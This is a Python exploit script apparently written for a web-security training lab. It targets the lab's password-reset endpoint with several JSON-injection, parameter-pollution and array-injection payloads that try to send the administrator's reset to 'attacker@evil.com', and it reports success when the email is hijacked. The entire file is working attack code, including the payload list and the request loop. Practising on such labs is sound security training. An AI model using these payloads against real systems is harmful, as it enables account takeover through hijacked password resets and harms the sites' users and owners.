#!/usr/bin/env python3
import requests
import sys
import json

def exploit_json_pollution(lab_url):
    """Try JSON injection with malformed Content-Type"""

    session = requests.Session()
    session.get(f"{lab_url}/login")

    reset_url = f"{lab_url}/forgot-password"

    # Malformed Content-Type
    headers = {
        "Content-Type": "x-www-form-urlencoded",  # MALFORMED!
        "Accept": "*/*",
        "Origin": lab_url,
        "Referer": f"{lab_url}/forgot-password"
    }

    print("[*] Testing JSON injection with malformed Content-Type...")

    # Try sending JSON data with the malformed Content-Type
    json_payloads = [
        # Direct JSON
        '{"username":"administrator","email":"attacker@evil.com"}',
        '{"username":"administrator","result":"attacker@evil.com"}',

        # JSON injection in form data
        'username=administrator"},"email":"attacker@evil.com","x":"',
        'username=administrator","result":"attacker@evil.com',

        # Mixed form and JSON
        'csrf=test&{"username":"administrator","email":"attacker@evil.com"}',

        # PHP-style array injection
        'username=administrator&email[]=attacker@evil.com',
        'username=administrator&result[]=attacker@evil.com',
    ]

    for i, payload in enumerate(json_payloads, 1):
        print(f"\n[Test {i}] Payload: {payload[:80]}...")

        try:
            response = session.post(
                reset_url,
                data=payload,
                headers=headers,
                allow_redirects=False
            )

            print(f"Status: {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()
                    print(f"Response: {result}")

                    if "result" in result:
                        email = result["result"]
                        if "attacker" in email or "evil" in email:
                            print(f"\n[!!!] SUCCESS! Email hijacked to: {email}")
                            return True
                except:
                    print(f"Non-JSON: {response.text[:100]}")

        except Exception as e:
            print(f"Error: {e}")

    # Try without any Content-Type
    print("\n[*] Testing without Content-Type header...")
    headers_no_ct = {
        "Accept": "*/*",
        "Origin": lab_url,
        "Referer": f"{lab_url}/forgot-password"
    }

    response = session.post(
        reset_url,
        data="username=administrator&email=attacker@evil.com",
        headers=headers_no_ct
    )
    print(f"Status: {response.status_code}")
    if response.status_code == 200:
        print(f"Response: {response.json()}")

    return False

if __name__ == "__main__":
    lab_url = "https://0aa1009a0379161a82cd10b40031005f.web-security-academy.net"

    if len(sys.argv) > 1:
        lab_url = sys.argv[1].rstrip('/')

    exploit_json_pollution(lab_url)